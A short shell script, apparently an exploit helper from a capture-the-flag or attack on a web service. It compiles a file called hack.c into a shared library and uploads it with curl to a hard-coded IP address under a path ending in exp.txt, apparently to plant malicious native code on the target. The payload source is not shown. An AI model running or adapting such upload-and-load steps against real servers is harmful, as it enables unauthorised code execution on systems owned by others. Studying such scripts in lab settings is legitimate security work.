#!/bin/sh
gcc -c -fPIC hack.c -o hack
gcc -shared hack -o hack.so
curl -F 'xxx=@./hack.so' http://35.246.234.136/images/c5d06e5d63a2d5b6ec392969fd4eac658f8f82d9/exp.txt
